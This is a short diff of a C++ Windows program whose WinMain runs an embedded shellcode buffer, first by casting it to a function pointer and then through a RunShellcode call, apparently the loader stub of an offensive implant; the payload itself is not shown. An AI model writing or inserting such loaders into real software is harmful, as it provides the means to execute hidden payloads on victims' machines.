@@ -1,9 +1,10 @@
+#include <windows.h>
+#define DLLEXPORT __declspec(dllexport)
 #include <Maverick.h>
 #include <Shellcode.h>
 
-auto Runner( VOID ) -> VOID {
-    VOID ( *Maverick )( VOID ) = ( decltype( Maverick ) )Shellcode::Data;
-    Maverick();
+static auto Runner() -> void {
+    RunShellcode(Shellcode::Data, Shellcode::Size);
 }
 
 auto WINAPI WinMain(
@@ -13,4 +14,5 @@ auto WINAPI WinMain(
     _In_ INT32     ShowCmd
 ) -> INT32 {
     Runner();
+    return 0;
 }
